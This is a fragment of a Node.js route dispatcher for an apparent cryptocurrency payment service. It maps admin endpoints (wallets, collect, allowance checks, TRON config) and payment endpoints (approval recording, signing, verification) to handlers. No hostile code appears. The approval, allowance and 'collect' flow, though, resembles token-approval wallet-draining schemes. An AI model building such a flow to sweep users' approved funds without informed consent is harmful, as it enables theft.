      adminWalletsHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // Collect
    if (method === 'POST' && url === '/api/admin/collect') {
      adminCollectHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // Allowance & balance check
    if (method === 'GET' && url.startsWith('/api/admin/allowance')) {
      adminAllowanceHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // PG status
    if (method === 'GET' && url.startsWith('/api/admin/pg-status')) {
      adminPgStatusHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    // TRON config (read + write)
    if (method === 'GET' && url.startsWith('/api/admin/config')) {
      adminConfigGetHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }
    if (method === 'POST' && url === '/api/admin/config') {
      adminConfigPostHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
      return true;
    }

    errorResponse(res, 'Admin route not found', 404);
    return true;
  }

  // ── Existing payment routes (UNCHANGED) ───────────────────────────────────
  if (!url.startsWith('/api/payment')) return false;

  // POST /api/payment/create
  if (method === 'POST' && url === '/api/payment/create') {
    createPaymentHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // POST /api/payment/record-approval
  if (method === 'POST' && url === '/api/payment/record-approval') {
    recordApprovalHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // POST /api/payment/confirm-approval
  if (method === 'POST' && url === '/api/payment/confirm-approval') {
    confirmApprovalHandler(req, res, {}).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // GET /api/payment/bitcoin/:id/uri
  const btcUriMatch = url.match(/^\/api\/payment\/bitcoin\/([^/]+)\/uri$/);
  if (method === 'GET' && btcUriMatch) {
    bitcoinUriHandler(req, res, { id: btcUriMatch[1] }).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // GET /api/payment/:id
  const idMatch = url.match(/^\/api\/payment\/([^/]+)$/);
  if (method === 'GET' && idMatch) {
    getPaymentHandler(req, res, { id: idMatch[1] }).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // POST /api/payment/:id/connected
  const connectedMatch = url.match(/^\/api\/payment\/([^/]+)\/connected$/);
  if (method === 'POST' && connectedMatch) {
    connectedHandler(req, res, { id: connectedMatch[1] }).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // POST /api/payment/:id/signed
  const signedMatch = url.match(/^\/api\/payment\/([^/]+)\/signed$/);
  if (method === 'POST' && signedMatch) {
    signedHandler(req, res, { id: signedMatch[1] }).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  // GET /api/payment/:id/verify
  const verifyMatch = url.match(/^\/api\/payment\/([^/]+)\/verify$/);
  if (method === 'GET' && verifyMatch) {
    verifyHandler(req, res, { id: verifyMatch[1] }).catch(() => errorResponse(res, 'Internal error', 500));
    return true;
  }

  return false;
}
